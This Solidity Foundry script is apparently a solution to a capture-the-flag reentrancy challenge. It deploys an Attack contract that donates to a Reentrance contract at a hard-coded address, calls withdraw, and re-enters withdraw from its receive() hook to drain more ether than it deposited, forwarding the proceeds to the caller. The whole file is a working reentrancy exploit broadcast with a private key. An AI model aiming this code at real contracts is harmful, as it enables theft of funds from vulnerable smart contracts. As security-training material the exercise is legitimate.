// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "../src/Re-entrancy.sol";

contract Attack {
    Reentrance public reentrance = Reentrance(payable(0xBbd44f11C4FB5545aC7296c2A313Eda2085D118B));

    constructor() payable {
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() public {
        reentrance.withdraw(0.001 ether);
        (bool succes,) = msg.sender.call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentrance.withdraw(0.001 ether);
    }
}

contract ReentrancySolution is Script {
    Attack public attack;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attack = new Attack{value: 0.001 ether}();
        attack.withdraw();
        vm.stopBroadcast();
    }
}
